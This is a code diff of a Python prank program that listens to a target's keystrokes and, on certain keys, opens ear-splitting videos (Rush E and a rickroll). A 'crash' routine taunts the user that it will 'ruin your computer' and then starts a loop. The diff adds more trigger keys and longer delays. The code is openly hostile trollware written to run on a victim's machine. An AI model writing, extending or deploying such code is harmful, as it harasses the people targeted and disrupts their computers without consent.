@@ -10,7 +10,7 @@ import webbrowser
 import os
 
 #detect keys the target pressed
-#can copy from ""else:"" to the ""e()"" above the next ""else:"" to add more keys that trolls the target
+#can copy from else: to the e() above the next else: to add more keys that trolls the target
 def on_press(key):
     if key == Key.shift:
         try:
@@ -29,6 +29,24 @@ def on_press(key):
                     e()
                 except AttributeError:
                     e()
+            else:
+                if key == Key.r:
+                    try:
+                        e()
+                    except AttributeError:
+                        e()
+                else:
+                    if key == Key.w:
+                        try:
+                            e()
+                        except AttributeError:
+                            e()
+                    else:
+                        if key == Key.i:
+                            try:
+                                e()
+                            except AttributeError:
+                                e()
 
 #code that opens rush E and rick roll, both earrape
 def e():
@@ -49,12 +67,13 @@ def crash():
     print("rlly?")
     sleep(2)
     print("alright, as you wish")
-    sleep(1)
+    sleep(2)
     print("oh btw it will ruin your computer unless you use ctrl+alt+del or u lucky")
-    sleep(0.5)
+    sleep(2)
     print("ugh why am I telling you these, juts start the ruining sequence")
-    sleep(0.5)
+    sleep(2)
     print("here you go!")
+    sleep(2)
     x=0
     y=randint(6, 101)
     while x<y:
@@ -75,5 +94,6 @@ with Listener(on_press=on_press) as listener:
         listener.join()
     except MyException as e:
         print("oof, things kinda went wrong. {0} was pressed".format(e.args[0]))
+
 
 
